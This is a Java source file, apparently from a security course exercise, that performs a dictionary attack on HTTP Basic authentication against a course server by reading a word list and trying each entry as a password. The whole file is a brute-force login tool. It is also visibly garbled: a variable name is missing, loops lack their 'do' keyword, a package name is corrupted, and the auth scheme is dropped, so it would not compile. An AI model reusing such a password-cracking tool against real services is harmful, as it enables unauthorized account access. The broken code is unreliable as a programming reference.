
import java.net.*;
import java.io.*;


public class Dictionary
{
   private String myUsername = "";
   private String myPassword = "";
   private String urlToCrack = "http://sec-crack.cs.rmit.edu./SEC/2";


   public static void main (String args[])
   {
      Dictionary d = new Dictionary();
   }

   public Dictionary()
   {
      generatePassword();
   }

   

   public void generatePassword()
   {
      try
      {
         BufferedReader  = new BufferedReader(new FileReader("/usr/share/lib/dict/words"));

         
         {
            myPassword = bf.readLine();
            crackPassword(myPassword);
         } while (myPassword != null);
      }
      catch(IOException e)
      {    }
   }


  

  public void crackPassword(String passwordToCrack)
  {
     String data, dataToEncode, encodedData;

     try
     {
         URL url = new URL (urlToCrack);

         

         dataToEncode = myUsername + ":" + passwordToCrack;

         

         encodedData = new bf.misc.BASE64Encoder().encode(dataToEncode.getBytes());

         URLConnection urlCon = url.openConnection();
         urlCon.setRequestProperty  ("Authorization", " " + encodedData);

         InputStream is = (InputStream)urlCon.getInputStream();
         InputStreamReader isr = new InputStreamReader(is);
         BufferedReader bf  = new BufferedReader (isr);

          
          {
             data = bf.readLine();
             System.out.println(data);
             displayPassword(passwordToCrack);
         } while (data != null);
      }
      catch (IOException e)
      {   }
   }


   public void displayPassword(String foundPassword)
   {
      System.out.println("\nThe cracked password is : " + foundPassword);
      System.exit(0);
   }
}


